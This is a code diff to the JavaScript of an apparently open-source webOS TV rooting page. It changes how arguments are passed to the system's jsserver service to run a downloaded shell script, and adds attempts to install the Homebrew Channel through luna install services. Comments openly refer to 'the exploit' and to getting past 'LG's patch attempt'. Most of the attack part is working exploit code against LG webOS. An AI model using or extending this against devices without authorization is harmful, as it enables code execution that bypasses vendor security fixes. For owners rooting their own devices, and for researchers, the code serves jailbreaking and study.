@@ -56,6 +56,9 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
             var optDebug = getQueryParam('debug') !== null;
             var optTelnet = getQueryParam('telnet') !== null;
             var optCurlInsecure = getQueryParam('curl-insecure') !== null;
+            // 'compat' uses the layout where jsserver takes the LAST token as
+            // the service directory (see run-webos26-compatible.html).
+            var optLayout = getQueryParam('layout');
 
             var shellScriptName = (function () {
                 var rawScript = getQueryParam('script');
@@ -215,7 +218,7 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                 logError('PalmServiceBridge is not available; are you running on a webOS device?');
             }
 
-            var downloadDir = '/media/internal/downloads';
+            var downloadDir = '/media/internal/downloads/slopbro_diag';
 
             function runService() {
                 logDebug('entered runService()');
@@ -226,7 +229,20 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                 }
 
                 var shellScriptPath = downloadDir + '/' + shellScriptName;
-                var args = ['--', '/tmp/run-js-service-no-cgroup', '^_~', downloadDir, shellScriptPath];
+                // jsserver feeds these straight to bootstrap-node.js. After "--",
+                // the first token is the cgroup marker file, the second is a dummy
+                // argv[0], the third is the service directory, and the rest are
+                // extra args. "/tmp/run-js-service-no-cgroup" is just a writable
+                // file path, NOT an executable.
+                var args;
+                if (optLayout === 'compat') {
+                    // Layout used by run-webos26-compatible.html: the service
+                    // directory is the last token and jsserver loads its
+                    // package.json main directly (no script argument).
+                    args = ['--', '/tmp/cgroup', 'dummy', downloadDir];
+                } else {
+                    args = ['--', '/tmp/run-js-service-no-cgroup', '^_~', downloadDir, shellScriptPath];
+                }
                 if (fakeServicePath !== null) {
                     // Straightforward way to get the fake service path into position to fool LG's patch attempt
                     args.unshift('a', 'b', 'c', fakeServicePath);
@@ -242,7 +258,6 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
 
                 bridge.onservicecallback = function (message) {
                     logDebug('received message: ' + message);
-
                     var response = parse(message, '/run response');
                     if (response === null) {
                         logError('received unparsable response from service: ' + message);
@@ -280,7 +295,6 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
 
             function requestDownload(file, onComplete) {
                 logDebug('requesting download of ' + file + ' from ' + baseUrl + file);
-
                 var bridge = createServiceBridge();
                 if (bridge === null) {
                     return;
@@ -361,7 +375,6 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                         }
 
                         logStatus('download of ' + file + ' complete (HTTP status ' + response.httpStatus + ')');
-
                         onComplete();
                         return;
                     }
@@ -409,7 +422,43 @@ Copyright 2026. Licensed under AGPL v3 or later. No warranties.
                 next();
             }
 
+            // Direct install attempt via VoiceWeb PalmServiceBridge
+            // Tries luna://com.webos.appInstallService/dev/install directly.
+            // devmode_enabled directory should authorize this without jsserver.
+            var installMethods = [
+                // Try localPath (direct path, no download phase)
+                {uri:'luna://com.webos.appInstallService/install',params:{id:'org.webosbrew.hbchannel',subscribe:true,useLocalPath:true}},
+                // applicationManager/install (different service)
+                {uri:'luna://com.webos.applicationManager/install',params:{id:'org.webosbrew.hbchannel',subscribe:true}},
+                // dev/install with path (old method, might work from VoiceWeb on webOS 22)
+                {uri:'luna://com.webos.appInstallService/dev/install',params:{id:'org.webosbrew.hbchannel',subscribe:true}},
+            ];
+
+            function tryDirectInstall() {
+                var ipkLocalPath = downloadDir + '/hbchannel.ipk';
+                installMethods.forEach(function(m, i) {
+                    var b = createServiceBridge();
+                    if (!b) return;
+                    var p = {};
+                    for (var k in m.params) { p[k] = m.params[k]; }
+                    // Try multiple parameter names for local path
+                    p.ipkUrl = 'file://' + ipkLocalPath;
+                    p.localPath = ipkLocalPath;
+                    p.ipkPath = ipkLocalPath;
+                    b.onservicecallback = function(msg) {
+                        var resp = null;
+                        try { resp = JSON.parse(msg); } catch(e2) {}
+                        if (resp && resp.returnValue && (resp.installed || (resp.details && resp.details.state === 'installed'))) {
+                            logStatus('HBC installed via method '+i+'!');
+                        }
+                    };
+                    try { b.call(m.uri, JSON.stringify(p)); } catch(e2) {}
+                });
+            }
+
             logDebug('hi');
+            // jsserver is the reliable path; appInstallService is a dead end on
+            // this firmware and its extra bridge calls can delay the exploit.
             runDownloads(downloads, runService);
         })();
     </script>
